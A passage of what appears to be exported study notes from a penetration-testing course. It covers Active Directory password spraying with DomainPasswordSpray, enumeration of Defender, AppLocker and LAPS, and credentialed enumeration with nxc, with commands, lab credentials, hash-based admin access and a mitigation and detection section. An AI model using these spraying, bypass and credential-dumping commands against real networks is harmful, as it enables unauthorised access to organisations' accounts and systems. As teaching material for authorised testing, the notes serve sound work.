88ad09182de639ccc6579eb0849751cf (Pwn3d!)\nSMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)\nSMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)\n```\n\nThe output above shows that the credentials were valid as a local admin on `3` systems in the `172.16.5.0/23` subnet. We could then move to enumerate each system to see if we can find anything that will help further our access.\n\nThis technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth. It is always worth looking for this issue during penetration tests, even if it is not part of our path to compromise the domain, as it is a common issue and should be highlighted for our clients. One way to remediate this issue is using the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/13-Internal Password Spraying - from Windows",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/13-Internal Password Spraying - from Windows.md",
    "title": "13 Internal Password Spraying   From Windows",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- From a foothold on a domain-joined Windows host, the DomainPasswordSpray tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Acti...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nFrom a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. Like how we ran the spraying attack from our Linux host, we can also supply a user list to the tool if we are on a Windows host but not authenticated to the domain. We may run into a situation where the client wants us to perform testing from a managed Windows device in their network that we can load tools onto. We may be physically on-site in their offices and wish to test from a Windows VM, or we may gain an initial foothold through some other attack, authenticate to a host in the domain and perform password spraying in an attempt to obtain credentials for an account that has more rights in the domain.\n\nThere are several options available to us with the tool. Since the host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us. We'll supply the `Password` flag and one single password and then use the `-OutFile` flag to write our output to a file for later use.\n\n#### Using DomainPasswordSpray.ps1\n\nInternal Password Spraying - from Windows\n\n```powershell-session\nPS C:\\htb> Import-Module .\\DomainPasswordSpray.ps1\nPS C:\\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n\n[*] Current domain is compatible with Fine-Grained Password Policy.\n[*] Now creating a list of users to spray...\n[*] The smallest lockout threshold discovered in the domain is 5 login attempts.\n[*] Removing disabled users from list.\n[*] There are 2923 total users found.\n[*] Removing users within 1 attempt of locking out from list.\n[*] Created a userlist containing 2923 users gathered from the current user's domain\n[*] The domain password policy observation window is set to  minutes.\n[*] Setting a  minute wait in between sprays.\n\nConfirm Password Spray\nAre you sure you want to perform a password spray against 2923 accounts?\n[Y] Yes  [N] No  [?] Help (default is \"Y\"): Y\n\n[*] Password spraying has begun with  1  passwords\n[*] This might take a while depending on the total number of users\n[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM\n[*] Writing successes to spray_success\n[*] SUCCESS! User:sgage Password:Welcome1\n[*] SUCCESS! User:tjohnson Password:Welcome1\n\n[*] Password spraying is complete\n[*] Any passwords that were successfully sprayed have been output to spray_success\n```\n\nWe could also utilize Kerbrute to perform the same user enumeration and spraying steps shown in the previous section. The tool is present in the `C:\\Tools` directory if you wish to work through the same examples from the provided Windows host.\n\n---\n\n## Mitigations\n\nSeveral steps can be taken to mitigate the risk of password spraying attacks. While no single solution will entirely prevent the attack, a defense-in-depth approach will render password spraying attacks extremely difficult.\n\n|Technique|Description|\n|---|---|\n|`Multi-factor Authentication`|Multi-factor authentication can greatly reduce the risk of password spraying attacks. Many types of multi-factor authentication exist, such as push notifications to a mobile device, a rotating One Time Password (OTP) such as Google Authenticator, RSA key, or text message confirmations. While this may prevent an attacker from gaining access to an account, certain multi-factor implementations still disclose if the username/password combination is valid. It may be possible to reuse this credential against other exposed services or applications. It is important to implement multi-factor solutions with all external portals.|\n|`Restricting Access`|It is often possible to log into applications with any domain user account, even if the user does not need to access it as part of their role. In line with the principle of least privilege, access to the application should be restricted to those who require it.|\n|`Reducing Impact of Successful Exploitation`|A quick win is to ensure that privileged users have a separate account for any administrative activities. Application-specific permission levels should also be implemented if possible. Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise.|\n|`Password Hygiene`|Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack. Also, using a password filter to restrict common dictionary words, names of months and seasons, and variations on the company's name will make it quite difficult for an attacker to choose a valid password for spraying attempts.|\n\n---\n\n## Other Considerations\n\nIt is vital to ensure that your domain password lockout policy doesn’t increase the risk of denial of service attacks. If it is very restrictive and requires an administrative intervention to unlock accounts manually, a careless password spray may lock out many accounts within a short period.\n\n---\n\n## Detection\n\nSome indicators of external password spraying attacks include many account lockouts in a short period, server or application logs showing many login attempts with valid or non-existent users, or many requests in a short period to a specific application or URL.\n\nIn the Domain Controller’s security log, many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.\n\nWith these mitigations finely tuned and with logging enabled, an organization will be well-positioned to detect and defend against internal and external password spraying attacks.\n\n---\n\n## External Password Spraying\n\nWhile outside the scope of this module, password spraying is also a common way that attackers use to attempt to gain a foothold on the internet. We have been very successful with this method during penetration tests to gain access to sensitive data through email inboxes or web applications such as externally facing intranet sites. Some common targets include:\n\n- Microsoft 0365\n- Outlook Web Exchange\n- Exchange Web Access\n- Skype for Business\n- Lync Server\n- Microsoft Remote Desktop Services (RDS) Portals\n- Citrix portals using AD authentication\n- VDI implementations using AD authentication such as VMware Horizon\n- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)\n- Custom web applications that use AD authentication\n\n---\n\n## Moving Deeper\n\nNow that we have several sets of valid credentials, we can begin digging deeper into the domain by performing credentialed enumeration with various tools. We will walk through several tools that complement each other to give us the most complete and accurate picture of a domain environment. With this information, we will seek to move laterally and vertically in the domain to eventually reach the end goal of our assessment.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/14-Enumerating Security Controls",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/14-Enumerating Security Controls.md",
    "title": "14 Enumerating Security Controls",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- After gaining a foothold, we could use this access to get a feeling for the defensive state of the hosts, enumerate the domain further now that our visibility is not as restricted, and, if necessa...",
    "category": "02_CPTS",
    "content": "\n---\n\nAfter gaining a foothold, we could use this access to get a feeling for the defensive state of the hosts, enumerate the domain further now that our visibility is not as restricted, and, if necessary, work at \"living off the land\" by using tools that exist natively on the hosts. It is important to understand the security controls in place in an organization as the products in use can affect the tools we use for our AD enumeration, as well as exploitation and post-exploitation. Understanding the protections we may be up against will help inform our decisions regarding tool usage and assist us in planning our course of action by either avoiding or modifying certain tools. Some organizations have more stringent protections than others, and some do not apply security controls equally throughout. There may be policies applied to certain machines that can make our enumeration more difficult that are not applied on other machines.\n\nNote: This section is intended to showcase possible security controls in place within a domain, but does not have an interactive component. Enumerating and bypassing security controls are outside the scope of this module, but we wanted to give an overview of the possible technologies we may encounter during an assessment.\n\n---\n\n## Windows Defender\n\nWindows Defender (or [Microsoft Defender](https://en.wikipedia.org/wiki/Microsoft_Defender) after the Windows 10 May 2020 Update) has greatly improved over the years and, by default, will block tools such as `PowerView`. There are ways to bypass these protections. These ways will be covered in other modules. We can use the built-in PowerShell cmdlet [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=win10-ps) to get the current Defender status. Here, we can see that the `RealTimeProtectionEnabled` parameter is set to `True`, which means Defender is enabled on the system.\n\n#### Checking the Status of Defender with Get-MpComputerStatus\n\nEnumerating Security Controls\n\n```powershell-session\nPS C:\\htb> Get-MpComputerStatus\n\nAMEngineVersion                 : 1.1.17400.5\nAMProductVersion                : 4.10.14393.0\nAMServiceEnabled                : True\nAMServiceVersion                : 4.10.14393.0\nAntispywareEnabled              : True\nAntispywareSignatureAge         : 1\nAntispywareSignatureLastUpdated : 9/2/2020 11:31:50 AM\nAntispywareSignatureVersion     : 1.323.392.0\nAntivirusEnabled                : True\nAntivirusSignatureAge           : 1\nAntivirusSignatureLastUpdated   : 9/2/2020 11:31:51 AM\nAntivirusSignatureVersion       : 1.323.392.0\nBehaviorMonitorEnabled          : False\nComputerID                      : 07D23A51-F83F-4651-B9ED-110FF2B83A9C\nComputerState                   : 0\nFullScanAge                     : 4294967295\nFullScanEndTime                 :\nFullScanStartTime               :\nIoavProtectionEnabled           : False\nLastFullScanSource              : 0\nLastQuickScanSource             : 2\nNISEnabled                      : False\nNISEngineVersion                : 0.0.0.0\nNISSignatureAge                 : 4294967295\nNISSignatureLastUpdated         :\nNISSignatureVersion             : 0.0.0.0\nOnAccessProtectionEnabled       : False\nQuickScanAge                    : 0\nQuickScanEndTime                : 9/3/2020 12:50:45 AM\nQuickScanStartTime              : 9/3/2020 12:49:49 AM\nRealTimeProtectionEnabled       : True\nRealTimeScanDirection           : 0\nPSComputerName                  :\n```\n\n---\n\n## AppLocker\n\nAn application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization. [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run. It provides granular control over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers. It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed. Organizations also often focus on blocking the `PowerShell.exe` executable, but forget about the other [PowerShell executable locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) such as `%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe` or `PowerShell_ISE.exe`. We can see that this is the case in the `AppLocker` rules shown below. All Domain Users are disallowed from running the 64-bit PowerShell executable located at:\n\n`%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe`\n\nSo, we can merely call it from other locations. Sometimes, we run into more stringent `AppLocker` policies that require more creativity to bypass. These ways will be covered in other modules.\n\n#### Using Get-AppLockerPolicy cmdlet\n\nEnumerating Security Controls\n\n```powershell-session\nPS C:\\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n\nPathConditions      : {%SYSTEM32%\\WINDOWSPOWERSHELL\\V1.0\\POWERSHELL.EXE}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 3d57af4a-6cf8-4e5b-acfc-c2c2956061fa\nName                : Block PowerShell\nDescription         : Blocks Domain Users from using PowerShell on workstations\nUserOrGroupSid      : S-1-5-21-2974783224-3764228556-2640795941-513\nAction              : Deny\n\nPathConditions      : {%PROGRAMFILES%\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 921cc481-6e17-4653-8f75-050b80acca20\nName                : (Default Rule) All files located in the Program Files folder\nDescription         : Allows members of the Everyone group to run applications that are located in the Program Files folder.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {%WINDIR%\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51\nName                : (Default Rule) All files located in the Windows folder\nDescription         : Allows members of the Everyone group to run applications that are located in the Windows folder.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : fd686d83-a829-4351-8ff4-27c7de5755d2\nName                : (Default Rule) All files\nDescription         : Allows members of the local Administrators group to run all applications.\nUserOrGroupSid      : S-1-5-32-544\nAction              : Allow\n```\n\n---\n\n## PowerShell Constrained Language Mode\n\nPowerShell [Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.\n\n#### Enumerating Language Mode\n\nEnumerating Security Controls\n\n```powershell-session\nPS C:\\htb> $ExecutionContext.SessionState.LanguageMode\n\nConstrainedLanguage\n```\n\n---\n\n## LAPS\n\nThe Microsoft [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed. The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) greatly facilitates this with several functions. One is parsing `ExtendedRights` for all computers with LAPS enabled. This will show groups specifically delegated to read LAPS passwords, which are often users in protected groups. An account that has joined a computer to a domain receives `All Extended Rights` over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.\n\n#### Using Find-LAPSDelegatedGroups\n\nEnumerating Security Controls\n\n```powershell-session\nPS C:\\htb> Find-LAPSDelegatedGroups\n\nOrgUnit                                             Delegated Groups\n-------                                             ----------------\nOU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\\Domain Admins\nOU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\\LAPS Admins\nOU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\\Domain Admins\nOU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\\LAPS Admins\nOU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\\Domain Admins\nOU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\\LAPS Admins\nOU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\\Domain Admins\nOU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\\LAPS Admins\nOU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\\Domain Admins\nOU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\\LAPS Admins\nOU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\\Domain Admins\nOU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\\LAPS Admins\nOU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\\Domain Admins\nOU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\\LAPS Admins\nOU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\\Domain Admins\nOU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\\LAPS Admins\nOU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\\Domain Admins\nOU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\\LAPS Admins\n```\n\nThe `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with \"All Extended Rights.\" Users with \"All Extended Rights\" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.\n\n#### Using Find-AdmPwdExtendedRights\n\nEnumerating Security Controls\n\n```powershell-session\nPS C:\\htb> Find-AdmPwdExtendedRights\n\nComputerName                Identity                    Reason\n------------                --------                    ------\nEXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\\Domain Admins Delegated\nEXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\\LAPS Admins   Delegated\nSQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\\Domain Admins Delegated\nSQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\\LAPS Admins   Delegated\nWS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\\Domain Admins Delegated\nWS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\\LAPS Admins   Delegated\n```\n\nWe can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.\n\n#### Using Get-LAPSComputers\n\nEnumerating Security Controls\n\n```powershell-session\nPS C:\\htb> Get-LAPSComputers\n\nComputerName                Password       Expiration\n------------                --------       ----------\nDC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45\nEXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30\nSQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09\nWS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04\n```\n\n---\n\n## Conclusion\n\nAs we have seen in this section, several other helpful AD enumeration techniques are available to us to determine what protections are in place. It is worth familiarizing yourself with all of these tools and techniques, and adding them to your arsenal of options. Now, let's continue our enumeration of the INLANEFREIGHT.LOCAL domain from a credentialed standpoint.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/15-Credentialed Enumeration - from Linux",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/15-Credentialed Enumeration - from Linux.md",
    "title": "15 Credentialed Enumeration   From Linux",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Now that we have acquired a foothold in the domain, it is time to dig deeper using our low privilege domain user credentials. Since we have a general idea about the domain's userbase and machines,...",
    "category": "02_CPTS",
    "content": "\n---\n\nNow that we have acquired a foothold in the domain, it is time to dig deeper using our low privilege domain user credentials. Since we have a general idea about the domain's userbase and machines, it's time to enumerate the domain in depth. We are interested in information about domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more. We have various options available, but the most important thing to remember is that most of these tools will not work without valid domain user credentials at any permission level. So at a minimum, we will have to have acquired a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host.\n\nTo follow along, spawn the target at the bottom of this section and SSH to the Linux attack host as the `htb-student` user. For enumeration of the INLANEFREIGHT.LOCAL domain using the tools installed on the ATTACK01 Parrot Linux host, we will use the following credentials: User=`forend` and password=`Klmcargo2`. Once our access is established, it's time to get to work. We'll start with `nxc`.\n\n---\n\n## nxc\n\n[nxc](https://github.com/byt3bl33d3r/nxc) (CME, now NetExec) is a powerful toolset to help with assessing AD environments. It utilizes packages from the Impacket and PowerSploit toolkits to perform its functions. For detailed explanations on using the tool and accompanying modules, see the [wiki](https://www.netexec.wiki/). Don't be afraid to use the `-h` flag to review the available options and syntax.\n\n#### CME Help Menu\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ nxc -h\n\nusage: nxc [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell]\n                    [--verbose]\n                    {mssql,smb,ssh,winrm} ...\n\n      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______\n     /      ||   _  \\         /   \\      /      ||  |/  / |   \\/   |     /   \\     |   _  \\  |   ____|\\  \\ /  / |   ____| /      |\n    |  ,----'|  |_)  |       /  ^  \\    |  ,----'|  '  /  |  \\  /  |    /  ^  \\    |  |_)  | |  |__    \\  V  /  |  |__   |  ,----'\n    |  |     |      /       /  /_\\  \\   |  |     |    <   |  |\\/|  |   /  /_\\  \\   |   ___/  |   __|    >   <   |   __|  |  |\n    |  `----.|  |\\  \\----. /  _____  \\  |  `----.|  .  \\  |  |  |  |  /  _____  \\  |  |      |  |____  /  .  \\  |  |____ |  `----.\n     \\______|| _| `._____|/__/     \\__\\  \\______||__|\\__\\ |__|  |__| /__/     \\__\\ | _|      |_______|/__/ \\__\\ |_______| \\______|\n\n                                         A swiss army knife for pentesting networks\n                                    Forged by @byt3bl33d3r using the powah of dank memes\n\n                                                      Version: 5.0.2dev\n                                                     Codename: P3l1as\noptional arguments:\n  -h, --help            show this help message and exit\n  -t THREADS            set how many concurrent threads to use (default: 100)\n  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)\n  --jitter INTERVAL     sets a random delay between each connection (default: None)\n  --darrell             give Darrell a hand\n  --verbose             enable verbose output\n\nprotocols:\n  available protocols\n\n  {mssql,smb,ssh,winrm}\n    mssql               own stuff using MSSQL\n    smb                 own stuff using SMB\n    ssh                 own stuff using SSH\n    winrm               own stuff using WINRM\n\nYa feelin' a bit buggy all of a sudden?\n```\n\nWe can see that we can use the tool with MSSQL, SMB, SSH, and WinRM credentials. Let's look at our options for CME with the SMB protocol:\n\n#### CME Options (SMB)\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ nxc smb -h\n\nusage: nxc smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k]\n                        [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST]\n                        [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE]\n                        [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {https,http}] [--server-host HOST]\n                        [--server-port PORT] [-H HASH [HASH ...]] [--no-bruteforce] [-d DOMAIN | --local-auth] [--port {139,445}]\n                        [--share SHARE] [--smb-server-port SMB_SERVER_PORT] [--gen-relay-list OUTPUT_FILE] [--continue-on-success]\n                        [--sam | --lsa | --ntds [{drsuapi,vss}]] [--shares] [--sessions] [--disks] [--loggedon-users] [--users [USER]]\n                        [--groups [GROUP]] [--local-groups [GROUP]] [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY]\n                        [--wmi-namespace NAMESPACE] [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST]\n                        [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--depth DEPTH] [--only-files]\n                        [--put-file FILE FILE] [--get-file FILE FILE] [--exec-method {atexec,smbexec,wmiexec,mmcexec}] [--force-ps32]\n                        [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE] [--clear-obfscripts]\n                        [target ...]\n\npositional arguments:\n  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or\n                        .Nessus file(s)\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -id CRED_ID [CRED_ID ...]\n                        database credential ID(s) to use for authentication\n  -u USERNAME [USERNAME ...]\n                        username(s) or file(s) containing usernames\n  -p PASSWORD [PASSWORD ...]\n                        password(s) or file(s) containing passwords\n  -k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)\n  \n<SNIP>  \n```\n\nCME offers a help menu for each protocol (i.e., `nxc winrm -h`, etc.). Be sure to review the entire help menu and all possible options. For now, the flags we are interested in are:\n\n- -u Username `The user whose credentials we will use to authenticate`\n- -p Password `User's password`\n- Target (IP or FQDN) `Target host to enumerate` (in our case, the Domain Controller)\n- --users `Specifies to enumerate Domain Users`\n- --groups `Specifies to enumerate domain groups`\n- --loggedon-users `Attempts to enumerate what users are logged on to a target, if any`\n\nWe'll start by using the SMB protocol to enumerate users and groups. We will target the Domain Controller (whose address we uncovered earlier) because it holds all data in the domain database that we are interested in. Make sure you preface all commands with `sudo`.\n\n#### CME - Domain User Enumeration\n\nWe start by pointing CME at the Domain Controller and using the credentials for the `forend` user to retrieve a list of all domain users. Notice when it provides us the user information, it includes data points such as the [badPwdCount](https://docs.microsoft.com/en-us/windows/win32/adschema/a-badpwdcount) attribute. This is helpful when performing actions like targeted password spraying. We could build a target user list filtering out any users with their `badPwdCount` attribute above 0 to be extra careful not to lock any accounts out.\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395\n\n<SNIP>\n```\n\nWe can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.\n\n#### CME - Domain Group Enumeration\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0\n\n<SNIP>\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0\n\n<SNIP>\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36\n\n<SNIP>\n```\n\nThe above snippet lists the groups within the domain and the number of users in each. The output also shows the built-in groups on the Domain Controller, such as `Backup Operators`. We can begin to note down groups of interest. Take note of key groups like `Administrators`, `Domain Admins`, `Executives`, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting during our assessment.\n\n#### CME - Logged On Users\n\nWe can also use CME to target other hosts. Let's check out what appears to be a file server to see what users are logged in currently.\n\nCredentialed Enumeration - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users\n\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 (Pwn3d!)\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\\clusteragent              logon_server: ACADEMY-EA-DC01\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\\lab_adm                   logon_server: ACADEMY-EA-DC01\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\\svc_qualys                logon_server: ACADEMY-EA-DC01\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\\wley                      logon_server: ACADEMY-EA-DC01\n\n<SNIP>\n```\n\nWe see that many users are logged into this server which is very interesting. We can also see that our user `forend` is a local admin because `(Pwn3d!)` appears after the tool successfully authenticates to the target host. A host like this may be used as a jump host or similar by administrative users. We can see that the user `svc_qualys` is logged in, who we earlier 